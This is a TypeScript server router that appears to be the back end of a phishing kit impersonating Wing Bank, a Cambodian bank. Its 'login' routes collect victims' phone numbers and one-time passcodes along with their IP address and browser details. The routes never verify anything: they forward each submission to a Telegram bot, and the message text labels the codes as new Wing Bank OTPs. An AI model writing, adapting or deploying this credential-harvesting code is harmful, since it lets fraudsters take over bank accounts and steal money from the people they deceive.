import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { savePhoneSubmission } from "./db";
import { sendTelegramMessage, formatPhoneSubmissionMessage } from "./telegram";

export const appRouter = router({
  system: systemRouter,

  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  login: router({
    submitPhone: publicProcedure
      .input(
        z.object({
          phoneNumber: z.string().min(1, "Phone number is required"),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const { phoneNumber } = input;
        
        // Get client IP and user agent
        const ipAddress = ctx.req.ip || ctx.req.headers['x-forwarded-for'] as string || 'unknown';
        const userAgent = ctx.req.headers['user-agent'] || 'unknown';

        try {
          // Save to database
          await savePhoneSubmission({
            phoneNumber,
            countryCode: "+855",
            ipAddress,
            userAgent,
          });

          // Send to Telegram
          const message = formatPhoneSubmissionMessage(phoneNumber, ipAddress, userAgent);
          await sendTelegramMessage(message);

          return {
            success: true,
            message: "Phone number submitted successfully",
          };
        } catch (error) {
          console.error("[Login] Error submitting phone:", error);
          throw new Error("Failed to submit phone number");
        }
      }),

    submitOtp: publicProcedure
      .input(
        z.object({
          phoneNumber: z.string().min(1),
          otpCode: z.string().min(4),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const { phoneNumber, otpCode } = input;
        
        // Get client IP and user agent
        const ipAddress = ctx.req.ip || ctx.req.headers['x-forwarded-for'] as string || 'unknown';
        const userAgent = ctx.req.headers['user-agent'] || 'unknown';

        try {
          // Send OTP to Telegram
          const message = `🔐 <b>رمز OTP جديد - Wing Bank</b>\n\n📱 <b>رقم الهاتف:</b> ${phoneNumber}\n🔢 <b>رمز OTP:</b> <code>${otpCode}</code>\n⏰ <b>الوقت:</b> ${new Date().toLocaleString("en-US", { timeZone: "Asia/Phnom_Penh" })}\n🌐 <b>عنوان IP:</b> ${ipAddress}`;
          await sendTelegramMessage(message);

          return {
            success: true,
            message: "OTP submitted successfully",
          };
        } catch (error) {
          console.error("[Login] Error submitting OTP:", error);
          throw new Error("Failed to submit OTP");
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;

